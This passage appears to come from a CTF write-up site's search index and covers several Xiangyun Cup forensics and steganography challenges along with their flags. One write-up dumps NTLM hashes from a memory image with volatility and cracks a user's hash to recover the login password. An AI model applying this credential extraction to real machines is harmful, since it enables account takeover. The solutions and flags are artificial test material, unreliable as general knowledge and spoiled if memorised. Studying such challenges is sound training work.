editor\u67e5\u770b\uff0c\u53d1\u73b0\u662f\u4e2a\u5012\u7740\u7684PNG\u3002\u5c06\u5176\u5012\u56de\u6765\uff0c\u6253\u5f00\u53d1\u73b0\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7801</p> <p>\u5f00\u5c40\u4e00\u4e2a\u7801</p>"},{"location":"Writeup/General%20Skills/shuffle_code/#_2","title":"\u6211\u7684\u89e3\u7b54","text":"<p>\u4e8c\u7ef4\u7801\u626b\u7801\u5f97\uff1a</p> <pre><code>col426327/1132122/1211132223/3113253/61531113/111312/5323125/2222/11122153/311111/14312121/11231211/2423211/262121/422221/622132/31121/221122111/5122311/2111221221/121692/12122111/232326/11142121/31253151/22111111123/111313121/1111111/2151371\n\nrow31121113/12321133/13111112/13112221121/12112232/16113232/11311311/21111231/11111211/711111117/2124112211/611111241/1311371/131152131/13/2121111311/521(11)11/1311321131/1211211/11111111/14221262/3411131/161713/422141/7122117/1111112111/7111412/71111121/131112131\n</code></pre> <p>\u53ef\u80fd\u90a3\u4e2a\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u5c31\u662f11\u8fd9\u4e00\u4e2a\u6570\uff0c\u5176\u4ed6\u90fd\u505a\u4e00\u4f4d\u6570\u89e3\uff0c\u5e76\u4e14\u8fd9\u4e9b\u6570\u957f\u5ea6\u96c6\u4e2d\u57286, 7, 8, 9, 10\u3002</p> <p>\u731c\u6d4b\u9898\u76ee\u7684\u95ee\u9898\u5f62\u5f0f\u662f\u6570\u7ec7\uff0c\u63a5\u4e0b\u6765\u5c31\u662fMisc\u4eb2\u7239\u7684\u4e2a\u4eba\u79c0\uff1a</p>"},{"location":"Writeup/General%20Skills/shuffle_code/#miscshowtime","title":"Misc\u4eb2\u7239\u7684showtime","text":"<p>\u6211\u770b\u4e0d\u61c2\uff0c\u4f46\u6211\u5927\u53d7\u9707\u64bc</p> <p>\u53c8\u753129*29\u63a8\u65ad\u53ef\u80fd\u662f\u4e2a\u4e8c\u7ef4\u7801\uff0c\u6309\u884c\u6253\u4e71\u3002\u6839\u636e\u4e8c\u7ef4\u7801\u89c4\u8303\u89e3\u51fa\u56fa\u5b9a\u4f4d\u7f6e\u5e76\u53cd\u5411\u66f4\u65b0\u6570\u7ec7\u3002</p> <p>\u6700\u540e\u53ea\u6709\u4e2d\u95f4\u90e8\u5206\u7684\u987a\u5e8f\u4e0d\u77e5\u9053\uff0c\u5171\u79cd\u53ef\u80fd\u6027\uff0c\u4f7f\u7528\u7a0b\u5e8f\u7a77\u4e3e\u3002</p> <p>\u8fd9\u4e5f\u80fd\u4fee\uff0c\u4e0d\u6127\u662fMisc\u4eb2\u7239</p> <pre><code>data = [[1,1,1,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,1,1,1,1,1],\n[1,0,0,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,1],\n[1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,0,0,0,1,1,0,1,0,1,1,1,0,1],\n[1,0,1,1,1,0,1,0,0,1,0,0,1,1,1,0,0,1,1,0,1,0,1,0,1,1,1,0,1],\n[1,0,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,1,0,0,1,0,1,1,1,0,1],\n[1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,1,0,0,0,0,0,1],\n[1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,1,1,1,1,1,1],\n[0,0,0,0,0,0,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],\n[1,0,0,1,1,1,1,1,1,0,1,0,0,0,0,1,1,1,1,1,1,1,0,0,1,0,1,1,1],\n[1,1,1,1,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,1,0,1,1,1,1,0,0,1],\n[1,1,0,0,1,0,1,1,0,0,1,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,0,1],\n[0,1,1,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,1,1,0,1,1,1,0,1],\n[1,1,0,0,1,0,1,1,0,0,0,1,0,1,0,1,0,0,0,1,0,1,1,1,0,1,0,0,1],\n[1,1,1,0,1,0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,1,1,1,0,0,0],\n[0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,1,0,1,1,0,1,1,1,0,1,1,0,0,0],\n[1,1,1,1,1,1,0,1,0,0,0,1,0,1,0,1,0,0,1,0,1,1,0,1,1,1,1,0,1],\n[0,1,1,1,0,1,1,1,1,0,0,1,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1],\n[1,0,0,1,1,0,0,0,1,1,1,0,1,1,0,1,0,1,0,1,1,1,0,0,1,1,1,0,0],\n[1,0,1,1,1,1,1,1,0,0,1,0,1,0,1,1,1,0,1,1,0,1,1,1,0,0,0,1,1],\n[1,0,1,1,1,1,0,0,1,1,0,1,1,0,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1],\n[1,1,1,1,1,0,1,1,0,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1],\n[0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,1,0,0,0,1,1,0,0,0,1,0,1,0,0],\n[1,1,1,1,1,1,1,0,1,0,0,1,0,1,0,1,0,1,1,1,1,0,1,0,1,1,0,0,0],\n[1,0,0,0,0,0,1,0,1,1,1,0,1,0,1,0,1,1,1,0,1,0,0,0,1,0,0,0,0],\n[1,0,1,1,1,0,1,0,1,0,0,0,1,1,1,0,0,0,1,1,1,1,1,1,1,0,0,1,0],\n[1,0,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,1,0,1,0,0,1,0,1,1,0,1],\n[1,0,1,1,1,0,1,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,1,0,0,1,1],\n[1,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,0,1,0,1,1,0,1,0,1,0,1],\n[1,1,1,1,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,0,1,1,0,1,0,0,0]]\n\nimport pyzbar.pyzbar as pyzbar\nfrom itertools import permutations\nfrom PIL import Image, ImageDraw as draw\nimport matplotlib.pyplot as plt\nfrom tqdm import tqdm\n\nshuffle_1 = [9, 11, 13, 15, 17, 19]\nshuffle_2 = [10, 12, 14, 16, 18]\nhead = data[0:9]\ntail = data[20:]\n\ndef body(body_1, body_2):\n    body = []\n    for i in range(5):\n        body.append(body_1[i])\n        body.append(body_2[i])\n    body.append(body_1[5])\n    return [data[i] for i in body]\n\ndef draw_img(data):\n    assert len(data) == 29 and len(data[0]) == 29\n    img = Image.new('RGB', (31, 31), (255,255,255))\n    for i, row in enumerate(data):\n        for j, pixel in enumerate(row):\n            img.putpixel((j + 1, i + 1), (0,0,0) if pixel == 1 else (255,255,255))\n    return img\n\nwith tqdm(total=720 * 120) as pbar:\n    for body_1 in permutations(shuffle_1):\n        for body_2 in permutations(shuffle_2):\n            im = draw_img(head + body(body_1, body_2) + tail)\n            barcodes = pyzbar.decode(im)\n            pbar.update(1)\n            if(len(barcodes) == 0):\n                continue\n            for barcode in barcodes:\n                barcodeData = barcode.data.decode(\"utf-8\")\n                print(barcodeData)\n                plt.imshow(im)\n                plt.show()\n</code></pre> <p>\u4fee\u590d\u6210\u529f\u7684\u4e8c\u7ef4\u7801\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p>\u7239\u4e2d\u7239\uff0c\u4ee3\u4e2d\u4ee3</p>"},{"location":"Writeup/General%20Skills/shuffle_code/#flag","title":"Flag","text":"<pre><code>flag{f31861a9-a753-47d5-8660-a8cada6c599e}\n</code></pre> <p>\u8fd9\u4e00\u8840\u771f\u7684\uff0c\u592a\u79c0\u4e86\uff0c\u7ed9\u4ed6\u5012\u6d17\u811a\u6c34\u53bb\u4e86</p>"},{"location":"Writeup/General%20Skills/shuffle_code/#reference","title":"Reference","text":"<p>Writeup from https://zhuanlan.zhihu.com/p/402713931</p>"},{"location":"Writeup/General%20Skills/xixixi/","title":"xixixi","text":"<p>Category: General Skills</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 50</p>"},{"location":"Writeup/General%20Skills/xixixi/#description","title":"Description","text":"<p>\u5ba4\u53cb\u6700\u8fd1\u6c89\u8ff7y\u795e\uff0c\u53c8\u6c2a\u53c8\u809d\uff0c\u8fd8ghs\u3002\u4e3a\u4e86\u4ed6\u7684\u8eab\u4f53\u7740\u60f3\uff0c\u6211\u628a\u4ed6\u7684s\u56fe\u6574\u6ca1\u4e86\u3002\u4f46\u6211\u660e\u660e\u5220\u4e86\u811a\u672c\u554a\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u80fd\u88ab\u4ed6\u53d1\u73b0......8\u8bf4\u4e86\uff0c\u533b\u9662\u7684\u7a7a\u8c03\u771f\u8212\u670d~</p>"},{"location":"Writeup/General%20Skills/xixixi/#solution","title":"Solution","text":"<p>\u78c1\u76d8\u5185\u6240\u6709\u5185\u5bb9\u5982\u4e0b\uff1a\uff08\u53ef\u7528winhex\u76f4\u63a5\u590d\u539f\uff09</p> <pre><code># !i.py\n\n\nimport struct\nfrom xixi import FAT32Parser\nfrom xixixi import Padding, picDepartList\n\n\ndef EncodePieces():\n  global clusterList\n  res = []\n  Range = len(picDepartList)    # 58\n  # GetRandomClusterList(n) - Generate a random cluster list with length n\n  clusterList = GetRandomClusterList(Range)\n\n\n  for i in range(Range):\n    if i != Range - 1:\n      newCRC = struct.pack(\"&lt;I\", clusterList[i+1])\n      plainData = picDepartList[i][:-4] + newCRC\n    else:\n      plainData = picDepartList[i]\n\n\n    # Show the first piece to him, hhh\n    if i == 0:\n      newPiece = plainData\n    else:\n      newPiece = ''\n      key = clusterList[i] &amp; 0xFE\n      for j in plainData:\n        newPiece += chr(ord(j) ^ key)\n    # Padding() -- Fill to an integral multiple of 512 with \\xFF\n    res.append(Padding(newPiece))\n  return res\n</code></pre> <pre><code># !ixi.py\n\n\nimport struct\n\n\nclass FAT32Parser(object):\n  def __init__(self, vhdFileName):\n    with open(vhdFileName, 'rb') as f:\n      self.diskData = f.read()\n    self.DBR_off = self.GetDBRoff()\n    self.newData = ''.join(self.diskData)\n\n\n  def GetDBRoff(self):\n    DPT_off = 0x1BE\n    target = self.diskData[DPT_off+8:DPT_off+12]\n    DBR_sector_off, = struct.unpack(\"&lt;I\", target)\n    return DBR_sector_off * 512\n\n\n  def GetFAT1off(self):\n    target = self.diskData[self.DBR_off+0xE:self.DBR_off+0x10]\n    FAT1_sector_off, = struct.unpack(\"&lt;H\", target)\n    return self.DBR_off + FAT1_sector_off * 512\n\n\n  def GetFATlength(self):\n    target = self.diskData[self.DBR_off+0x24:self.DBR_off+0x28]\n    FAT_sectors, = struct.unpack(\"&lt;I\", target)\n    return FAT_sectors * 512\n\n\n  def GetRootoff(self):\n    FAT_length = self.GetFATlength()\n    FAT2_off = self.GetFAT1off() + FAT_length\n    return FAT2_off + FAT_length\n\n\n  def Cluster2FAToff(self, cluster):\n    FAT1_off = self.GetFAT1off()\n    return FAT1_off + cluster * 4\n\n\n  def Cluster2DataOff(self, cluster):\n    rootDir_off = self.GetRootoff()\n    return rootDir_off + (cluster - 2) * 512\n</code></pre> <p>\u5206\u6790\u4e24\u4e2a\u6587\u4ef6\uff0c\u53ef\u4ee5\u5f97\u51fa\uff1a</p> <p>!ixi.py\u4e2d\u7684\u7c7bFAT32Parser\uff0c\u53ef\u4ee5\u5bf9\u78c1\u76d8\u8fdb\u884c\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002!i.py\u4e2d\u7684\u6587\u4ef6\u662f\u5bf9\u6587\u4ef6\u8fdb\u884c\u5206\u5757\u513f\u5904\u7406\uff0c\u5e76\u4e14\u56fe\u7247\u88ab\u5206\u4e3a\u4e8658\u5757\u513f\uff0c\u9664\u4e86\u7b2c\u4e00\u5757\u513f\u672a\u88ab\u52a0\u5bc6\u5916\uff0c\u5176\u4f59\u5757\u513f\u90fd\u8fdb\u884c\u4e86\u5982\u4e0b\u5904\u7406\uff1a</p> <ol> <li> <p>\u6bcf\u5757\u513f\u7684\u6700\u540e\u56db\u4f4d\uff0c\u5373CRC\u6821\u9a8c\u503c\u88ab\u66ff\u6362\u6210\u4e86\u4e0b\u4e00\u5757\u513f\u6240\u5728\u7684\u7c07\u53f7\u3002</p> </li> <li> <p>\u9664\u7b2c\u4e00\u5757\u513f\u5916\uff0c\u5176\u4f59\u5757\u513f\u7684\u5185\u5bb9\u90fd\u4f1a\u4e0e\u8be5\u5757\u513f\u7684\u7c07\u53f7 &amp; 0xFE\u6574\u4f53\u8fdb\u884c\u5f02\u6216\u3002</p> </li> </ol> <p>\u6240\u4ee5\u60f3\u8981\u53cd\u89e3\u56fe\u7247\u5757\u513f\uff0c\u9700\u8981\u5bf9\u6bcf\u4e2a\u5757\u513f\u5148\u8fdb\u884c\u5f02\u6216\u89e3\u5bc6\uff0c\u518d\u67e5\u770b\u540e\u56db\u4f4d\u5f97\u5230\u4e0b\u4e00\u5757\u513f\u7684\u7c07\u53f7\u3002</p> <pre><code># -*- coding: utf-8 -*-\n# @Project: Hello Python!\n# @File   : exp\n# @Author : Tr0jAn &lt;Tr0jAn@birkenwald.cn&gt;\n# @Date   : 2020-11-22\nimport struct\nimport binascii\nfrom xixi import FAT32Parser\n\n\ndef read(n):\n    global key\n    binary = b''\n    for i in vhd.read(n):\n        binary += (i ^ (key &amp; 0xFE)).to_bytes(length=1, byteorder='big', signed=False)\n    return binary\n\n\nFAT = FAT32Parser(\"new.vhd\")\nvhd = open(\"new.vhd\", \"rb\")\nvhd.seek(0x27bae00)  # \u5b9a\u4f4d\u78c1\u76d8\u4e2d\u56fe\u7247\u4f4d\u7f6e\nflag = open(\"flag.png\", \"wb\")\nflag.write(vhd.read(8))  # \u5199\u5165png\u5934\nkey = 0\nwhile True:\n    d = read(8)\n    length, cType = struct.unpack(\"&gt;I4s\", d)\n    print(length, cType)  # length\u4e3a\u6570\u636e\u957f\u5ea6\uff0ccType\u4e3a\u6570\u636e\u5757\u7c7b\u578b\n    data = read(length)\n    CRC = struct.unpack(\"&gt;I\", read(4))[0]\n    print(CRC)\n    rCRC = binascii.crc32(cType + data) &amp; 0xffffffff\n    print(rCRC)\n    rDATA = struct.pack(\"&gt;I\", length) + cType + data + struct.pack(\"&gt;I\", rCRC)\n    flag.write(rDATA)\n    if CRC != rCRC:  # CRC\u9519\u8bef\u7684IDAT\u6570\u636e\u5757\n        b_endian = struct.pack(\"&gt;I\", CRC)\n        clusterList = struct.unpack(\"&lt;I\", b_endian)[0]\n        print(clusterList)\n        vhd.seek(FAT.Cluster2DataOff(clusterList))\n        key = clusterList &amp; 0xFE\n    if cType == b\"IEND\":\n        break\n</code></pre> <p>\u5bf9\u78c1\u76d8\u53cd\u89e3\u51faflag.png</p> <p> </p>"},{"location":"Writeup/General%20Skills/xixixi/#flag","title":"Flag","text":"<p>flag{0cfdd1ad80807da6c0413de606bb0ae4}</p>"},{"location":"Writeup/General%20Skills/xixixi/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/","title":"\u5230\u70b9\u4e86","text":"<p>Category: General Skills</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 40</p>"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/#description","title":"Description","text":"<p>\u6211\u90a3\u4e48\u591a\u9057\u61be\uff0c\u90a3\u4e48\u591a\u671f\u76fc\uff0c\u4f60\u77e5\u9053\u5417\uff08\u4e0b\u96e8\u718a\u732b\u5934</p>"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/#solution","title":"Solution","text":"<p>\u6253\u5f001.docx\u7684\u9690\u85cf\u6587\u5b57\uff0c\u770b\u5230\u7b2c\u4e8c\u4e2a\u6587\u6863\u5bc6\u7801\u7684\u63d0\u793a</p> <p>\u200b    </p> <p>\u7206\u78342.docx\u7684\u5bc6\u7801\u5f97\u5230 20201024</p> <p>\u8be5\u5bc6\u7801\u540c\u65f6\u4e5f\u662f\u8be5\u6587\u4ef6\u7684\u521b\u5efa\u65f6\u95f4</p> <p>\u200b     </p> <p>\u8fdb\u51652.docx\u540ectrl+a\u5168\u9009</p> <p>\u7136\u540e\u590d\u5236\u51fa\u6765\u53ef\u4ee5\u5f97\u5230\u4e00\u4e32\u57f9\u6839\u5bc6\u6587AABBAABBBAABBBAAAABBABBABABAAAAABBAAABBBBAABBBAABABABBAAABAAAABAABAABBABAAAAABAA</p> <p>\u5728\u7ebf\u89e3\u5bc6\u5f97GOODNIGHTSWEETIE</p> <p>\u200b     </p> <p>3.docx\u5f53\u538b\u7f29\u5305\u6253\u5f00\uff0c\u53d1\u73b04.zip\uff0c\u89e3\u538b\u5f97\u52304.bmp</p> <p>\u200b     </p> <p>\u4f7f\u7528wbStego4\u5de5\u5177\u5904\u7406\u8be5bmp\u56fe\u7247</p> <p>\u7b2c\u56db\u6b65\u7684\u89e3\u5bc6\u5bc6\u7801\u4e3a\u57f9\u6839\u89e3\u5bc6\u540e\u7684GOODNIGHTSWEETIE</p> <p> </p> <p>\u7136\u540e\u4e0b\u4e00\u6b65\u751f\u6210flag.txt \u62ff\u5230flag</p> <p></p>"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/#flag","title":"Flag","text":"<p>flag{2ec9405ac7bcfb16f5fd494bcf21337c}</p>"},{"location":"Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/","title":"\u5c42\u5c42\u53d6\u8bc1","text":"<p>Category: General Skills</p> <p>Source: \u7965\u4e91\u676f2021</p> <p>Author: unknown</p> <p>Score: 10</p>"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#description","title":"Description","text":"<p>\u9644\u4ef6\u4e0b\u8f7d \u63d0\u53d6\u7801\uff08GAME\uff09</p> <p>\uff08\u672c\u9898\u9644\u4ef6\u8f83\u5927\uff09</p>"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u9898\u76ee\u7ed9\u6211\u4eec\u4e00\u4e2amemdump\u548c\u4e00\u4e2a\u78c1\u76d8\u6587\u4ef6\u3002</p>"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#_3","title":"\u6211\u7684\u89e3\u7b54","text":"<p>\u53ef\u4ee5\u7528volatility\u770bmemdump\uff0c<code>filescan</code>\u548c<code>cmdscan</code>\u53ef\u4ee5\u53d1\u73b0\u9898\u76ee\u662f\u7528\u4e86\u4e00\u4e2a\u53eb\u4f5cFTK Imager\u7684\u8f6f\u4ef6\u5f04\u51fa\u6765\u7684\u955c\u50cf\u3002</p> <p>\u6211\u4eec\u5c1d\u8bd5\u7528DiskGenius\u6253\u5f00\u78c1\u76d8\u6587\u4ef6\uff0c\u5728\u684c\u9762\u5f97\u5230\u4e86\u4e2a<code>flag.txt</code>\u3002\u3002</p> <p>\u674e\u6c0f\u795e\u9b54\u604b</p> <p>\u53ef\u80fd\u662f\u63d0\u793a\u8981\u4eff\u771f\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u5632\u8bbd\u3002\u5148\u4e0d\u7ba1\u4ed6\u3002\u4e0b\u9762\u8fd8\u6709\u4e2aBitLocker\u52a0\u5bc6\u7684\u5206\u533a</p> <p>\u54df\uff1f</p> <p>\u5c1d\u8bd5\u56de\u5230\u5185\u5b58\u53d6\u8bc1\uff0c\u7528<code>filescan</code>\u627e\u5176\u4ed6\u6587\u4ef6\u4f46\u662f\u65e0\u679c\uff0c\u7528<code>hivelist</code>\u4ee5\u53ca<code>hashdump</code>\u627e\u5230\u64cd\u4f5c\u7cfb\u7edf\u7684\u8d26\u53f7\u5bc6\u7801\uff1a</p> <pre><code>volatility -f \"memdump/memdump.mem\" --profile=Win7SP1x64 hivelist\nVolatility Foundation Volatility Framework 2.6\nVirtual            Physical           Name\n------------------ ------------------ ----\n0xfffff8a000ce7410 0x000000001a045410 \\SystemRoot\\System32\\Config\\SAM\n0xfffff8a000dcb010 0x0000000019482010 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT\n0xfffff8a000e5f010 0x00000000199c9010 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT\n0xfffff8a0013f1010 0x000000000a8d3010 \\??\\C:\\Users\\XiaoMing\\ntuser.dat\n0xfffff8a001409010 0x000000000a56e010 \\??\\C:\\Users\\XiaoMing\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat\n0xfffff8a00605c010 0x000000003c087010 \\SystemRoot\\System32\\Config\\DEFAULT\n0xfffff8a00000f010 0x0000000022787010 [no name]\n0xfffff8a000024010 0x0000000023512010 \\REGISTRY\\MACHINE\\SYSTEM\n0xfffff8a000060410 0x00000000211d0410 \\REGISTRY\\MACHINE\\HARDWARE\n0xfffff8a0002bb010 0x000000003c017010 \\Device\\HarddiskVolume3\\Boot\\BCD\n0xfffff8a000334010 0x0000000000b83010 \\SystemRoot\\System32\\Config\\SOFTWARE\n0xfffff8a000c96010 0x0000000017104010 \\SystemRoot\\System32\\Config\\SECURITY\nvolatility -f \"memdump/memdump.mem\" --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000ce7410\nVolatility Foundation Volatility Framework 2.6\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nXinSai:1000:aad3b435b51404eeaad3b435b51404ee:27caa41e7118fd4429d9b9cbd87aaa40:::\nXiaoMing:1001:aad3b435b51404eeaad3b435b51404ee:92efa7f9f2740956d51157f46521f941:::\n</code></pre> <p>\u7136\u540e\u53bbcmd5\u5c1d\u8bd5\u67e5\u8be2NTLM Hash\uff0c\u53d1\u73b0XiaoMing\u548cXinSai\u7684\u90fd\u67e5\u4e0d\u51fa\uff0c\u4f46\u662fAdministrator\u548cGuest\u7684\u90fd\u662f\u7a7a\u5bc6\u7801\u3002\uff08XiaoMing\u7684NTLM Hash\u5728cmd5\u4e2d\u662f\u4e00\u6761\u4ed8\u8d39\u8bb0\u5f55\uff09</p> <p>\u56de\u5230\u78c1\u76d8\u4e2d\uff0c\u6211\u4eec\u518d\u7ffb\u4e00\u7ffb\uff0c\u53d1\u73b0\u78c1\u76d8\u4e2d\u53ef\u4ee5\u5728<code>\\Users\\XiaoMing\\AppData\\Local\\Temp</code>\u91cc\u9762\u627e\u5230\u4e24\u4e2a\u6d41\u91cf\u5305\uff0c\u5176\u4e2d\u5728</p> <pre><code>wireshark_4D9DE10B-B9DF-4EFF-93CB-50C8BB2AF217_20200813223005_a03980.pcapng\n</code></pre> <p>\u8fd9\u4e2a\u6d41\u91cf\u5305\u91cc\u9762\u641cflag\u53d1\u73b0\u4e00\u4e2aUDP\u6d41\u91cc\u9762\u627e\u5230\u4e86<code>flag.docx</code>\uff0c\u5b83\u5728\u4e00\u4e2aRAR\u538b\u7f29\u5305\u91cc\u9762\u3002</p> <p>\u6211\u4eec\u5bfc\u51fa\u8fd9\u4e2aRAR\u538b\u7f29\u5305\uff0c\u4e0d\u8fc7\u5c1d\u8bd5\u89e3\u538b\u7684\u65f6\u5019\u8981\u5bc6\u7801\u3002</p> <p>\u76f4\u63a5\u6253\u5f00\u8fd9\u4e2aRAR\u538b\u7f29\u5305\uff0c\u63d0\u793a\u538b\u7f29\u5305\u5bc6\u7801\u8ddf\u5f00\u673a\u5bc6\u7801\u76f8\u540c\u3002</p> <p>\u53e6\u5916\uff0c\u78c1\u76d8\u684c\u9762\u4e0a\u63d0\u793a\u8981\u4eff\u771f\u6253\u5f00\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u4ed6\u90a3\u4e2a\u78c1\u76d8\u6587\u4ef6\u7528DiskGenius\u8f6c\u6210vmdk\uff0c\u518d\u7528vmware\u6253\u5f00\u3002</p> <p>\u53ef\u4ee5\u8fdb\u5165\u5230\u6b22\u8fce\u9875\u9762\uff0c\u4f46\u662f\u65e0\u8bba\u4ee5\u8d26\u6237XiaoMing\u8fd8\u662fXinSai(xm)\u8fdb\u5165\u7cfb\u7edf\u90fd\u8981\u767b\u5f55\u5bc6\u7801\u3002</p> <p>\u505a\u5230\u8fd9\u91cc\uff0c\u73b0\u5728\u6709\u4e24\u4e2a\u672a\u77e5\uff1aBitLocker\u7684\u5bc6\u7801\u548c\u7cfb\u7edf\u7684\u767b\u9646\u5bc6\u7801\uff08\u63d0\u793a\u548c\u538b\u7f29\u5305\u5bc6\u7801\u4e00\u6837\uff09</p> <p>\u6211\u4eec\u5c1d\u8bd5cmd5\u91cc\u9762\u4ed8\u8d39\u67e5\u8be2\u90a3\u4e2aXiaoMing\u7684NTLM Hash\u8bb0\u5f55\u3002\u67e5\u5f97\u4e3a\uff1a</p> <pre><code>xiaoming_handsome\n</code></pre> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5f00\u673a\u5bc6\u7801\uff0c\u548c\u538b\u7f29\u5305\u7684\u89e3\u538b\u5bc6\u7801\u3002</p> <p>\u5c1d\u8bd5\u628a\u538b\u7f29\u5305\u89e3\u538b\u51fa\u6765\uff0c\u7ed3\u679c\u89e3\u538b\u51fa\u6765\u4e86<code>flag.docx</code>\u6587\u4ef6\uff0c\u4f46\u662f\u53d1\u73b0<code>flag.docx</code>\u4e5f\u662f\u9700\u8981\u5bc6\u7801\u624d\u80fd\u6253\u5f00\u7684\u3002</p> <p>VMware\u4e2d\u53ef\u4ee5\u8f93\u5bc6\u7801\u8fdb\u7cfb\u7edf\uff0c\u5f15\u5165\u773c\u5e18\u7684\u4e3a\u5982\u4e0bWindows 7\u4fbf\u7b3a\uff1a</p> <p>\u90a3\u4f60\u4e3a\u4ec0\u4e48\u4e0d\u5e72\u8106\u4e00\u7801\u901a\u5f97\u4e86</p> <p>\u6211\u4eec\u731c\u6d4b\u662f\u6709\u5176\u4ed6\u7684Windows 7\u4fbf\u7b3a\uff0c\u6240\u4ee5\u67e5\u770b\u4fbf\u7b3a\u5b58\u653e\u5728\u78c1\u76d8\u4e2d\u7684\u8def\u5f84\uff1a</p> <p>https://answers.microsoft.com/zh-hans/windows/forum/all/windows-7-%E4%BE%BF%E7%AC%BA/0712dba1-9349-e011-8dfc-68b599b31bf5</p> <p>\u641c\u5230\u8def\u5f84\u540e\uff0c\u590d\u5236\u51fa\u6765\uff0c\u62d6\u8fdb010 Editor\u67e5\u770b\uff1a</p> <p>Aw\u524d\u7f00</p> <p>\u8fd9\u91cc\u5927\u6982\u5c31\u662f\u684c\u9762\u4e0a\u6211\u4eec\u80fd\u770b\u5230\u7684\u90a3\u4e2a\u4fbf\u7b3a\u4e0a\u7684\u5185\u5bb9\uff0c\u518d\u5f80\u4e0b\u4e00\u70b9\u70b9\uff1a</p> <p>word</p> <p>\u770b\u5230word\uff0c\u7136\u540e\u4e0b\u9762\u5c31\u662f<code>xiaoming1314</code>\uff0c\u731c\u6d4b\u662f<code>flag.docx</code>\u7684\u5bc6\u7801\uff0c\u5c1d\u8bd5\u540e\u53d1\u73b0\u6b63\u786e\uff0c\u5e76\u5229\u7528\u5176\u6253\u5f00<code>flag.docx</code>\u4fbf\u5f97\u5230flag\u3002</p>"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#flag","title":"Flag","text":"<pre><code>flag{9ca871b668f2-b668-097c-cbm8-9op404c891e2}\n</code></pre>"},{"location":"Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/#reference","title":"Reference","text":"<p>Writeup from https://zhuanlan.zhihu.com/p/402713931</p>"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/","title":"\u5e26\u97f3\u4e50\u5bb6","text":"<p>Category: General Skills</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 20</p>"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/#description","title":"Description","text":"<p>\u54aa\u6793\u5d03\u772f\uff0c\u97f3\u4e50\u592a\u597d\u542c\u4e86\u3002\u6211\u4e5f\u8981\u521b\u4f5c\u4e00\u66f2\u3002</p>"},{"location":"Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/#solution","title":"Solution","text":"<p>\u62ff\u5230\u624b\u5148file\u770b\u4e00\u4e0bdecode_it\u7684\u7c7b\u578b</p> <p>\u200b     </p> 